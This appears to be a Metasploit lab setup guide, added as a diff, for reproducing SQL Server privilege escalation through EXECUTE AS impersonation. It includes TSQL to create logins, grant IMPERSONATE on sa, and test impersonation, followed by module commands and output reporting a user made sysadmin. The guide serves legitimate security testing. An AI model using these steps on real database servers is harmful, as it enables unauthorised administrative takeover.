@@ -1,0 +1,88 @@
+SQL Server: Escalating privileges using EXCUTE AS
+Lab Setup Guide
+
+Below I've provided some basic steps for setting up a SQL Server instance that can be used to replicate the scenario exploited by the mssql_escalate_executeas module.
+
+1.	Download the Microsoft SQL Server Express install that includes SQL Server Management Studio.  It can be download at http://msdn.microsoft.com/en-us/evalcenter/dn434042.aspx
+
+2.	Install SQL Server by following the wizard, but make sure to enabled mixed-mode authentication and run the service as LocalSystem for the sake of the lab.
+
+3. Make sure to enable the tcp protocol so that module can connect to the listener.
+http://blogs.msdn.com/b/sqlexpress/archive/2005/05/05/415084.aspx
+
+4.	Log into the SQL Server with the "sa" account setup during installation using the SQL Server Management Studio application.
+
+5.	Press the "New Query" button and use the TSQL below to create a new users for the lab. 
+
+-- Create login 1
+CREATE LOGIN MyUser1 WITH PASSWORD = 'MyPassword!';
+
+-- Create login 2
+CREATE LOGIN MyUser2 WITH PASSWORD = 'MyPassword!';
+
+-- Create login 3
+CREATE LOGIN MyUser3 WITH PASSWORD = 'MyPassword!';
+
+6. Provide the MyUser1 login with permissions to impersonate MyUser2, MyUser3, and sa.
+USE master;
+GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
+GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
+GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
+GO
+
+7. Log into the SQL Server using the MyUser1 account.
+
+8. Press the "New Query" button and use the TSQL below to confirm the permissions were added.
+
+SELECT b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id 
+WHERE a.permission_name = 'IMPERSONATE'
+
+9. Test out the impersonate in another query window with the TSQL below.
+
+select SYSTEM_USER
+select IS_SRVROLEMEMBER('sysadmin')
+execute as login = 'sa'
+select SYSTEM_USER
+select IS_SRVROLEMEMBER('sysadmin')
+revert
+select SYSTEM_USER
+select IS_SRVROLEMEMBER('sysadmin')
+
+10. Test out the module.
+
+use auxiliary/admin/mssql/mssql_esclaate_executeas
+set rhosts <target ip>
+set rport <target database port>
+set username MyUser1
+set password MyPassword!
+run
+
+msf auxiliary(mssql_escalate_executeas) > run
+
+[*] Attempting to connect to the database server at 127.0.0.1:1171 as MyUser1...
+[+] Connected.
+[*] Checking if MyUser1 has the sysadmin role...
+[*] You're NOT a sysadmin, let's try to change that.
+[*] Enumerating a list of users that can be impersonated...
+[+] 3 users can be impersonated:
+[*]  - sa
+[*]  - MyUser2
+[*]  - MyUser3
+[*] Checking if any of them are sysadmins...
+[+]  - sa is a sysadmin!
+[*] Attempting to impersonate sa...
+[+] Congrats, MyUser1 is now a sysadmin!.
+[*] Auxiliary module execution completed
+
+
+msf auxiliary(mssql_escalate_executeas) > run
+
+[*] Attempting to connect to the database server at 127.0.0.1:1171 as MyUser1...
+[+] Connected.
+[*] Checking if MyUser1 has the sysadmin role...
+[+] MyUser1 has the sysadmin role, no escalation required.
+[*] Auxiliary module execution completed
+msf auxiliary(mssql_escalate_executeas) > run
